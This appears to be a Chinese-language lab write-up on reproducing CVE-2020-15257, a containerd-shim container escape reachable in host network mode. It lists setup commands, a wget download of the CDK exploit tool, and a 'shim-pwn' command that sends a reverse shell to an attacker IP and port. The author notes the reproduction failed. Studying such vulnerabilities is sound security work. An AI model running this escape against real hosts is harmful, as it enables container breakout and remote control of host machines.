# CVE-2020-15257

## Description

在版本1.3.9之前和1.4.0~1.4.2的Containerd中，由于在网络模式为host的情况下，容器与宿主机共享一套Network namespace ，此时containerd-shim API暴露给了用户，而且访问控制仅仅验证了连接进程的有效UID为0，但没有限制对抽象Unix域套接字的访问，刚好在默认情况下，容器内部的进程是以root用户启动的。在两者的共同作用下，容器内部的进程就可以像主机中的containerd一样，连接containerd-shim监听的抽象Unix域套接字，调用containerd-shim提供的各种API，从而实现容器逃逸。

## Exploit


漏洞环境准备：
```shell
./metarget cnv install cve-2020-15257
```

启动容器：
```shell
sudo docker run -it --net=host --name=15257 ubuntu /bin/bash
```
在容器内执行 `cat /proc/net/unix|grep -a "containerd-shim"` 可看到抽象命名空间Unix域套接字.

构建exp
```shell
apt-get update
apt-get install wget
wget https://github.com/Xyntax/CDK/releases/download/0.1.6/cdk_v0.1.6_release.tar.gz
tar -zxvf cdk_v0.1.6_release.tar.gz 
```

启动exp
```shell
./cdk_linux_amd64 run shim-pwn [攻击机ip] [监听端口]./cdk_linux_amd64 run shim-pwn 192.168.1.8 12345
```

由于对应的Docker版本过旧无法拉取镜像复现失败
考虑一下手动下载https://blog.51cto.com/u_16175515/9155157